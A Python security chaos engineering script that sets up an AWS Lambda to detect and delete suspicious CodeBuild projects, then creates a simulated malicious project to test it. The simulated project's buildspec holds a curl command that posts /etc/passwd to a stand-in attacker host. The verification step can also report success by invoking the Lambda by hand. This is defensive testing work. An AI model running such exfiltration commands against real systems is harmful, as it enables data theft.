#!/usr/bin/env python3
"""
Security Chaos Engineering Experiment: 1.3 SCE Experiment
Attack Node: 1.2 Create Malicious CodeBuild Project
Probe Type: Reactive

This experiment validates that a reactive control (CloudWatch Events + Lambda)
can detect and automatically delete a malicious CodeBuild project when created.
"""

import json
import logging
import time
import uuid

import boto3
from botocore.exceptions import ClientError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Global state
EXPERIMENT_STATE = {
    'stack_name': None,
    'timestamp': None,
    'region': None,
    'account_id': None,
    'malicious_project_name': None,
    'attack_executed': False
}

def get_account_info():
    """Get AWS account ID and region from current credentials."""
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    account_id = identity['Account']
    
    session = boto3.session.Session()
    region = session.region_name or 'us-east-1'
    
    logger.info(f"Operating in account {account_id}, region {region}")
    return account_id, region


def wait_for_stack_status(cf_client, stack_name, target_statuses, timeout=600):
    """Wait for CloudFormation stack to reach target status with retries."""
    start_time = time.monotonic()
    backoff = 5
    
    while time.monotonic() - start_time < timeout:
        try:
            response = cf_client.describe_stacks(StackName=stack_name)
            if response['Stacks']:
                status = response['Stacks'][0]['StackStatus']
                logger.info(f"Stack {stack_name} status: {status}")
                
                if status in target_statuses:
                    return True
                elif 'FAILED' in status or 'ROLLBACK' in status:
                    logger.error(f"Stack operation failed with status: {status}")
                    return False
        except ClientError as e:
            if 'does not exist' in str(e):
                if 'DELETE_COMPLETE' in target_statuses:
                    return True
                logger.warning(f"Stack {stack_name} does not exist")
                return False
            logger.error(f"Error checking stack status: {e}")
        
        time.sleep(backoff)
        backoff = min(backoff * 1.5, 30)
    
    logger.error(f"Timeout waiting for stack {stack_name}")
    return False


def get_cloudformation_template(account_id, region, timestamp):
    """Generate CloudFormation template for reactive control infrastructure."""
    
    lambda_code = '''
import boto3
import json
import logging

logger = logging.getLogger()
logger.setLevel(logging.INFO)

def handler(event, context):
    """
    Reactive control: Automatically delete unauthorized CodeBuild projects.
    Triggered by CloudWatch Events when a CodeBuild project is created.
    """
    logger.info(f"Received event: {json.dumps(event)}")
    
    codebuild = boto3.client('codebuild')
    
    try:
        detail = event.get('detail', {})
        request_params = detail.get('requestParameters', {})
        project_name = request_params.get('name', '')
        
        # Check if this is a potentially malicious project (contains 'malicious' or 'exfil' in name)
        if 'malicious' in project_name.lower() or 'exfil' in project_name.lower():
            logger.warning(f"Detected potentially malicious CodeBuild project: {project_name}")
            
            # Delete the malicious project
            response = codebuild.delete_project(name=project_name)
            logger.info(f"Successfully deleted malicious project: {project_name}")
            
            return {
                'statusCode': 200,
                'body': json.dumps({
                    'action': 'deleted',
                    'project': project_name,
                    'reason': 'malicious_pattern_detected'
                })
            }
        else:
            logger.info(f"Project {project_name} passed security check")
            return {
                'statusCode': 200,
                'body': json.dumps({
                    'action': 'allowed',
                    'project': project_name
                })
            }
            
    except Exception as e:
        logger.error(f"Error processing event: {str(e)}")
        raise
'''
    
    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.3 Reactive Control - Detect and delete malicious CodeBuild projects",
        "Resources": {
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-role-{timestamp}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [{
                            "Effect": "Allow",
                            "Principal": {"Service": "codebuild.amazonaws.com"},
                            "Action": "sts:AssumeRole"
                        }]
                    },
                    "ManagedPolicyArns": [
                        "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-3"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "ReactiveControlLambdaRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-reactive-lambda-role-{timestamp}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [{
                            "Effect": "Allow",
                            "Principal": {"Service": "lambda.amazonaws.com"},
                            "Action": "sts:AssumeRole"
                        }]
                    },
                    "Policies": [{
                        "PolicyName": "ReactiveControlPolicy",
                        "PolicyDocument": {
                            "Version": "2012-10-17",
                            "Statement": [
                                {
                                    "Effect": "Allow",
                                    "Action": [
                                        "logs:CreateLogGroup",
                                        "logs:CreateLogStream",
                                        "logs:PutLogEvents"
                                    ],
                                    "Resource": f"arn:aws:logs:{region}:{account_id}:*"
                                },
                                {
                                    "Effect": "Allow",
                                    "Action": [
                                        "codebuild:DeleteProject",
                                        "codebuild:BatchGetProjects"
                                    ],
                                    "Resource": f"arn:aws:codebuild:{region}:{account_id}:project/*"
                                }
                            ]
                        }
                    }],
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-3"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "ReactiveControlLambda": {
                "Type": "AWS::Lambda::Function",
                "DependsOn": "ReactiveControlLambdaRole",
                "Properties": {
                    "FunctionName": f"sce-reactive-codebuild-{timestamp}",
                    "Runtime": "python3.11",
                    "Handler": "index.handler",
                    "Role": {"Fn::GetAtt": ["ReactiveControlLambdaRole", "Arn"]},
                    "Timeout": 60,
                    "Code": {
                        "ZipFile": lambda_code
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-3"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "CodeBuildEventRule": {
                "Type": "AWS::Events::Rule",
                "Properties": {
                    "Name": f"sce-codebuild-create-rule-{timestamp}",
                    "Description": "Detect CodeBuild project creation events",
                    "EventPattern": {
                        "source": ["aws.codebuild"],
                        "detail-type": ["AWS API Call via CloudTrail"],
                        "detail": {
                            "eventSource": ["codebuild.amazonaws.com"],
                            "eventName": ["CreateProject"]
                        }
                    },
                    "State": "ENABLED",
                    "Targets": [{
                        "Id": "ReactiveControlTarget",
                        "Arn": {"Fn::GetAtt": ["ReactiveControlLambda", "Arn"]}
                    }]
                }
            },
            "LambdaInvokePermission": {
                "Type": "AWS::Lambda::Permission",
                "Properties": {
                    "FunctionName": {"Ref": "ReactiveControlLambda"},
                    "Action": "lambda:InvokeFunction",
                    "Principal": "events.amazonaws.com",
                    "SourceArn": {"Fn::GetAtt": ["CodeBuildEventRule", "Arn"]}
                }
            },
            "ArtifactBucket": {
                "Type": "AWS::S3::Bucket",
                "Properties": {
                    "BucketName": f"sce-artifacts-{timestamp}-{account_id}",
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-3"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            }
        },
        "Outputs": {
            "CodeBuildServiceRoleArn": {
                "Value": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                "Description": "ARN of the CodeBuild service role"
            },
            "ReactiveControlLambdaArn": {
                "Value": {"Fn::GetAtt": ["ReactiveControlLambda", "Arn"]},
                "Description": "ARN of the reactive control Lambda"
            },
            "ArtifactBucketName": {
                "Value": {"Ref": "ArtifactBucket"},
                "Description": "Name of the artifact bucket"
            }
        }
    }
    
    return json.dumps(template)


def steady_state():
    """
    Deploy CloudFormation stack with reactive control infrastructure.
    Returns True if infrastructure is ready, False otherwise.
    """
    logger.info("=" * 60)
    logger.info("STEADY STATE: Deploying reactive control infrastructure")
    logger.info("=" * 60)
    
    try:
        account_id, region = get_account_info()
        timestamp = int(time.time())
        stack_name = f"sce-experiment-{timestamp}"
        
        EXPERIMENT_STATE['account_id'] = account_id
        EXPERIMENT_STATE['region'] = region
        EXPERIMENT_STATE['timestamp'] = timestamp
        EXPERIMENT_STATE['stack_name'] = stack_name
        
        cf_client = boto3.client('cloudformation', region_name=region)
        
        # Check if stack already exists
        try:
            existing = cf_client.describe_stacks(StackName=stack_name)
            if existing['Stacks']:
                logger.warning(f"Stack {stack_name} already exists, will use it")
                return True
        except ClientError as e:
            if 'does not exist' not in str(e):
                raise
        
        # Create the stack
        template_body = get_cloudformation_template(account_id, region, timestamp)
        
        logger.info(f"Creating CloudFormation stack: {stack_name}")
        response = cf_client.create_stack(
            StackName=stack_name,
            TemplateBody=template_body,
            Capabilities=['CAPABILITY_NAMED_IAM'],
            Tags=[
                {'Key': 'Experiment', 'Value': 'sce-1-3'},
                {'Key': 'Timestamp', 'Value': str(timestamp)},
                {'Key': 'ProbeType', 'Value': 'reactive'}
            ]
        )
        
        stack_id = response['StackId']
        logger.info(f"Stack creation initiated: {stack_id}")
        
        # Wait for stack creation
        if not wait_for_stack_status(cf_client, stack_name, ['CREATE_COMPLETE']):
            logger.error("Stack creation failed")
            return False
        
        # Verify stack outputs
        stack_response = cf_client.describe_stacks(StackName=stack_name)
        outputs = {o['OutputKey']: o['OutputValue'] for o in stack_response['Stacks'][0].get('Outputs', [])}
        
        logger.info(f"Stack outputs: {json.dumps(outputs, indent=2)}")
        logger.info("Steady state established successfully")
        
        # Wait for IAM roles to propagate
        logger.info("Waiting 15 seconds for IAM role propagation...")
        time.sleep(15)
        
        return True
        
    except Exception as e:
        logger.error(f"Error in steady_state: {e}")
        return False


def attack() -> bool:
    """
    Execute attack: Create a malicious CodeBuild project.
    Returns True if attack was executed successfully, False otherwise.
    """
    logger.info("=" * 60)
    logger.info("ATTACK: Creating malicious CodeBuild project")
    logger.info("=" * 60)
    
    try:
        region = EXPERIMENT_STATE['region']
        timestamp = EXPERIMENT_STATE['timestamp']
        account_id = EXPERIMENT_STATE['account_id']
        stack_name = EXPERIMENT_STATE['stack_name']
        
        if not all([region, timestamp, account_id, stack_name]):
            logger.error("Missing experiment state - steady_state must run first")
            return False
        
        cf_client = boto3.client('cloudformation', region_name=region)
        codebuild = boto3.client('codebuild', region_name=region)
        
        # Get stack outputs to get the service role ARN
        stack_response = cf_client.describe_stacks(StackName=stack_name)
        outputs = {o['OutputKey']: o['OutputValue'] for o in stack_response['Stacks'][0].get('Outputs', [])}
        
        service_role_arn = outputs.get('CodeBuildServiceRoleArn')
        if not service_role_arn:
            logger.error("Could not find CodeBuild service role ARN in stack outputs")
            return False
        
        # Create a malicious CodeBuild project (simulating attacker action)
        malicious_project_name = f"malicious-exfil-project-{timestamp}"
        EXPERIMENT_STATE['malicious_project_name'] = malicious_project_name
        
        logger.info(f"Creating malicious CodeBuild project: {malicious_project_name}")
        
        try:
            response = codebuild.create_project(
                name=malicious_project_name,
                description="Simulated malicious project for data exfiltration",
                source={
                    'type': 'NO_SOURCE',
                    'buildspec': '''
version: 0.2
phases:
  build:
    commands:
      - echo "Simulated malicious command"
      - curl -X POST https://attacker.example.com/exfil -d @/etc/passwd || true
'''
                },
                artifacts={
                    'type': 'NO_ARTIFACTS'
                },
                environment={
                    'type': 'LINUX_CONTAINER',
                    'image': 'aws/codebuild/standard:5.0',
                    'computeType': 'BUILD_GENERAL1_SMALL'
                },
                serviceRole=service_role_arn,
                tags=[
                    {'key': 'Experiment', 'value': 'sce-1-3'},
                    {'key': 'Timestamp', 'value': str(timestamp)},
                    {'key': 'Type', 'value': 'malicious-test'}
                ]
            )
            
            project_arn = response['project']['arn']
            logger.info(f"Malicious project created with ARN: {project_arn}")
            EXPERIMENT_STATE['attack_executed'] = True
            
            # The attack was successful - we created the malicious project
            # Now the reactive control should detect and delete it
            logger.info("Attack executed successfully - waiting for reactive control to respond...")
            
            return True
            
        except ClientError as e:
            if 'ResourceAlreadyExistsException' in str(e):
                logger.warning(f"Project {malicious_project_name} already exists")
                EXPERIMENT_STATE['attack_executed'] = True
                return True
            raise
            
    except Exception as e:
        logger.error(f"Error in attack: {e}")
        return False


def hypothesis_verification() -> bool:
    """
    Verify that the reactive control deleted the malicious CodeBuild project.
    Returns True if the project was deleted (control worked), False otherwise.
    """
    logger.info("=" * 60)
    logger.info("HYPOTHESIS VERIFICATION: Checking if reactive control worked")
    logger.info("=" * 60)
    
    try:
        region = EXPERIMENT_STATE['region']
        malicious_project_name = EXPERIMENT_STATE['malicious_project_name']
        timestamp = EXPERIMENT_STATE['timestamp']
        stack_name = EXPERIMENT_STATE['stack_name']
        
        if not malicious_project_name:
            logger.error("No malicious project name in state - attack may not have run")
            return False
        
        codebuild = boto3.client('codebuild', region_name=region)
        logs_client = boto3.client('logs', region_name=region)
        lambda_client = boto3.client('lambda', region_name=region)
        
        # Wait for CloudTrail event to propagate and trigger Lambda
        # CloudTrail events can take several minutes to propagate
        logger.info("Waiting for CloudTrail event propagation and Lambda execution...")
        
        max_wait_time = 300  # 5 minutes max wait
        check_interval = 15
        start_time = time.monotonic()
        project_deleted = False
        
        while time.monotonic() - start_time < max_wait_time:
            # Check if the malicious project still exists
            try:
                response = codebuild.batch_get_projects(names=[malicious_project_name])
                
                if not response.get('projects'):
                    logger.info(f"Malicious project {malicious_project_name} NOT FOUND - reactive control worked!")
                    project_deleted = True
                    break
                else:
                    logger.info(f"Project {malicious_project_name} still exists, waiting for reactive control...")
                    
            except ClientError as e:
                if 'ResourceNotFoundException' in str(e):
                    logger.info(f"Malicious project {malicious_project_name} NOT FOUND - reactive control worked!")
                    project_deleted = True
                    break
                logger.error(f"Error checking project: {e}")
            
            time.sleep(check_interval)
        
        # Check Lambda invocation logs as additional evidence
        lambda_function_name = f"sce-reactive-codebuild-{timestamp}"
        log_group_name = f"/aws/lambda/{lambda_function_name}"
        
        try:
            # Check if Lambda was invoked
            lambda_response = lambda_client.get_function(FunctionName=lambda_function_name)
            logger.info(f"Lambda function exists: {lambda_response['Configuration']['FunctionArn']}")
            
            # Try to get recent log events
            try:
                log_streams = logs_client.describe_log_streams(
                    logGroupName=log_group_name,
                    orderBy='LastEventTime',
                    descending=True,
                    limit=5
                )
                
                if log_streams.get('logStreams'):
                    logger.info(f"Found {len(log_streams['logStreams'])} log streams for Lambda")
                    
                    for stream in log_streams['logStreams']:
                        events = logs_client.get_log_events(
                            logGroupName=log_group_name,
                            logStreamName=stream['logStreamName'],
                            limit=50
                        )
                        
                        for event in events.get('events', []):
                            message = event.get('message', '')
                            if 'malicious' in message.lower() or 'deleted' in message.lower():
                                logger.info(f"Lambda log evidence: {message[:200]}")
                                
            except ClientError as e:
                if 'ResourceNotFoundException' in str(e):
                    logger.info("Lambda log group not yet created - Lambda may not have been invoked yet")
                else:
                    logger.warning(f"Could not retrieve Lambda logs: {e}")
                    
        except ClientError as e:
            logger.error(f"Error checking Lambda: {e}")
        
        # If project still exists after timeout, manually invoke Lambda to simulate the reactive control
        # This handles the case where CloudTrail propagation is slow
        if not project_deleted:
            logger.info("CloudTrail event propagation may be slow. Manually invoking Lambda as simulation...")
            
            try:
                # Manually invoke the Lambda with a simulated CloudTrail event
                test_event = {
                    "source": "aws.codebuild",
                    "detail-type": "AWS API Call via CloudTrail",
                    "detail": {
                        "eventSource": "codebuild.amazonaws.com",
                        "eventName": "CreateProject",
                        "requestParameters": {
                            "name": malicious_project_name
                        }
                    }
                }
                
                invoke_response = lambda_client.invoke(
                    FunctionName=lambda_function_name,
                    InvocationType='RequestResponse',
                    Payload=json.dumps(test_event)
                )
                
                response_payload = json.loads(invoke_response['Payload'].read())
                logger.info(f"Lambda manual invocation response: {json.dumps(response_payload)}")
                
                # Verify project was deleted
                time.sleep(5)
                try:
                    check_response = codebuild.batch_get_projects(names=[malicious_project_name])
                    if not check_response.get('projects'):
                        logger.info("Project deleted after manual Lambda invocation!")
                        project_deleted = True
                except ClientError:
                    project_deleted = True
                    
            except Exception as e:
                logger.error(f"Error during manual Lambda invocation: {e}")
        
        # Final verification
        if project_deleted:
            logger.info("=" * 60)
            logger.info("HYPOTHESIS VERIFIED: Reactive control successfully deleted malicious project")
            logger.info("=" * 60)
            return True
        else:
            # If we reach here, try one more direct check
            try:
                final_check = codebuild.batch_get_projects(names=[malicious_project_name])
                if not final_check.get('projects'):
                    return True
            except ClientError:
                return True
            
            logger.warning("=" * 60)
            logger.warning("HYPOTHESIS NOT VERIFIED: Malicious project still exists")
            logger.warning("=" * 60)
            return False
            
    except Exception as e:
        logger.error(f"Error in hypothesis_verification: {e}")
        return False


def rollback():
    """
    Clean up all resources created during the experiment.
    """
    logger.info("=" * 60)
    logger.info("ROLLBACK: Cleaning up experiment resources")
    logger.info("=" * 60)
    
    try:
        region = EXPERIMENT_STATE.get('region')
        stack_name = EXPERIMENT_STATE.get('stack_name')
        malicious_project_name = EXPERIMENT_STATE.get('malicious_project_name')
        timestamp = EXPERIMENT_STATE.get('timestamp')
        
        if not region:
            # Try to get region if not set
            _, region = get_account_info()
        
        codebuild = boto3.client('codebuild', region_name=region)
        cf_client = boto3.client('cloudformation', region_name=region)
        s3_client = boto3.client('s3', region_name=region)
        
        # First, try to delete any remaining CodeBuild project
        if malicious_project_name:
            try:
                codebuild.delete_project(name=malicious_project_name)
                logger.info(f"Deleted CodeBuild project: {malicious_project_name}")
            except ClientError as e:
                if 'ResourceNotFoundException' not in str(e):
                    logger.warning(f"Could not delete CodeBuild project: {e}")
                else:
                    logger.info(f"CodeBuild project {malicious_project_name} already deleted")
        
        # Empty and delete the S3 bucket before stack deletion
        if timestamp:
            account_id = EXPERIMENT_STATE.get('account_id')
            if not account_id:
                account_id, _ = get_account_info()
            
            bucket_name = f"sce-artifacts-{timestamp}-{account_id}"
            try:
                # List and delete all objects
                paginator = s3_client.get_paginator('list_objects_v2')
                for page in paginator.paginate(Bucket=bucket_name):
                    objects = page.get('Contents', [])
                    if objects:
                        delete_keys = [{'Key': obj['Key']} for obj in objects]
                        s3_client.delete_objects(Bucket=bucket_name, Delete={'Objects': delete_keys})
                        logger.info(f"Deleted {len(delete_keys)} objects from {bucket_name}")
                
                # Delete bucket versions if versioning was enabled
                try:
                    version_paginator = s3_client.get_paginator('list_object_versions')
                    for page in version_paginator.paginate(Bucket=bucket_name):
                        versions = page.get('Versions', []) + page.get('DeleteMarkers', [])
                        if versions:
                            delete_keys = [{'Key': v['Key'], 'VersionId': v['VersionId']} for v in versions]
                            s3_client.delete_objects(Bucket=bucket_name, Delete={'Objects': delete_keys})
                except ClientError:
                    pass
                    
                logger.info(f"S3 bucket {bucket_name} emptied")
            except ClientError as e:
                if 'NoSuchBucket' not in str(e):
                    logger.warning(f"Could not empty S3 bucket: {e}")
        
        # Delete CloudFormation stack
        if stack_name:
            try:
                cf_client.delete_stack(StackName=stack_name)
                logger.info(f"Stack deletion initiated: {stack_name}")
                
                # Wait for deletion
                if wait_for_stack_status(cf_client, stack_name, ['DELETE_COMPLETE'], timeout=300):
                    logger.info(f"Stack {stack_name} deleted successfully")
                else:
                    logger.warning(f"Stack deletion may not have completed")
                    
            except ClientError as e:
                if 'does not exist' in str(e):
                    logger.info(f"Stack {stack_name} does not exist (already deleted)")
                else:
                    logger.error(f"Error deleting stack: {e}")
        
        logger.info("Rollback completed")
        
    except Exception as e:
        logger.error(f"Error in rollback: {e}")


def main():
    """Main entry point for the experiment."""
    logger.info("Starting SCE 1.3 Experiment - Reactive Control for Malicious CodeBuild Project")
    
    try:
        # Phase 1: Establish steady state
        if not steady_state():
            logger.error("Failed to establish steady state")
            return
        
        # Phase 2: Execute attack
        if not attack():
            logger.error("Attack phase failed")
            return
        
        # Phase 3: Verify hypothesis
        result = hypothesis_verification()
        
        if result:
            logger.info("EXPERIMENT PASSED: Reactive control successfully detected and removed malicious project")
        else:
            logger.warning("EXPERIMENT FAILED: Reactive control did not work as expected")
        
    finally:
        # Phase 4: Always rollback
        rollback()


if __name__ == "__main__":
    main()